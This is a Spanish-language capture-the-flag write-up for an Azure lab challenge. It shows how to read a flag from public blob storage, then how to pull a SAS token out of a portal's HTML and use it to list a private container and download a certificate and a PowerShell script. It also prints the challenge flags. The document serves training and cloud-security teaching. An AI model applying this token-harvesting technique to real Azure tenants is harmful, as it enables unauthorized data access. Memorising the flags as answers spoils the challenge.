# Challenge 01 - Azure Combined Storage & Identity Solution

## Descripción del Challenge

Este challenge combinado presenta **dos vectores de ataque** diferentes:

1. **Vector Básico**: Acceso directo a storage público → Flag: `CLD[b8c4d0f3-5g9e-5b2c-ad4f-8g3b6e9c7f5d]`
2. **Vector Avanzado**: Portal MediCloudX con SAS tokens → Flag: `CTF{m3d1cl0udx_4zur3_st0r4g3_s4s_t0k3n_3xf1ltr4t10n}`

---

## 🎯 Vector 1: Acceso Directo (Básico)

### Información Disponible
Con base en los outputs de Terraform:
```bash
azure_storage_website_endpoint = "https://ctf25sa[suffix].z13.web.core.windows.net/"
azure_flag_url = "https://ctf25sa[suffix].z13.web.core.windows.net/flag.txt"
```

### Solución Paso a Paso

**Paso 1: Acceder directamente a la flag**
```bash
# Método más simple - acceso web directo
curl https://ctf25sa[suffix].z13.web.core.windows.net/flag.txt
```

**Resultado esperado:**
```
CLD[b8c4d0f3-5g9e-5b2c-ad4f-8g3b6e9c7f5d]
```

---

## 🔬 Vector 2: MediCloudX Research Portal (Avanzado)

### Información Disponible
```bash
research_portal_url = "https://ctf25sa[suffix].blob.core.windows.net/research-portal/research-portal.html"
```

### Solución Paso a Paso

**Paso 1: Acceder al Portal de Investigación**
```bash
# Abrir el portal MediCloudX en el navegador
open https://ctf25sa[suffix].blob.core.windows.net/research-portal/research-portal.html
```

**Paso 2: Inspeccionar el Código Fuente**
```bash
# Descargar y examinar el HTML
curl https://ctf25sa[suffix].blob.core.windows.net/research-portal/research-portal.html > research-portal.html

# Buscar tokens SAS embebidos
grep -i "sas" research-portal.html
grep -i "token" research-portal.html
```

**Paso 3: Extraer el SAS Token**
En el código fuente, encontrarás una imagen con URL similar a:
```html
<img src="https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg?sv=2022-11-02&ss=b&srt=co&sp=rl&se=2026-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=[SIGNATURE]" />
```

**Paso 4: Usar el SAS Token para Acceder al Container Privado**
```bash
# Extraer el SAS token de la URL de la imagen
SAS_TOKEN="sv=2022-11-02&ss=b&srt=co&sp=rl&se=2026-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=[SIGNATURE]"

# Listar archivos en el container privado
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research?restype=container&comp=list&${SAS_TOKEN}"
```

**Paso 5: Descargar Archivos Sensibles**
```bash
# Descargar la flag del container privado
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/flag.txt?${SAS_TOKEN}"

# Descargar el certificado base64
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?${SAS_TOKEN}" > cert.b64

# Descargar el script PowerShell
curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/script.ps1?${SAS_TOKEN}" > script.ps1
```

**Paso 6: (Opcional) Usar el Certificado para Azure AD**
```bash
# Decodificar el certificado
base64 -d cert.b64 > medicloud_cert.pfx

# Ejecutar el script PowerShell (si tienes PowerShell)
pwsh script.ps1
```

**Resultado esperado:**
```
CTF{m3d1cl0udx_4zur3_st0r4g3_s4s_t0k3n_3xf1ltr4t10n}
```

---

## 📋 Resumen de Vulnerabilidades

### Vector 1 (Básico)
- **CWE-200**: Exposición de información sensible
- **Misconfiguration**: Container público sin restricciones

### Vector 2 (Avanzado)  
- **CWE-200**: SAS token expuesto en código cliente
- **CWE-732**: Permisos excesivos en SAS token
- **CWE-522**: Certificado almacenado en ubicación accesible
- **CWE-521**: Contraseña débil de certificado

---

## 🎯 Puntos de Aprendizaje

1. **Inspección de código fuente**: Siempre revisar HTML/JS por credenciales embebidas
2. **SAS Tokens**: Tokens con permisos excesivos y larga expiración son peligrosos
3. **Escalación de privilegios**: Un token de lectura puede llevar a acceso completo
4. **Certificados en storage**: Nunca almacenar certificados en ubicaciones accesibles
5. **Defensa en profundidad**: Un solo punto de falla puede comprometer todo el sistema
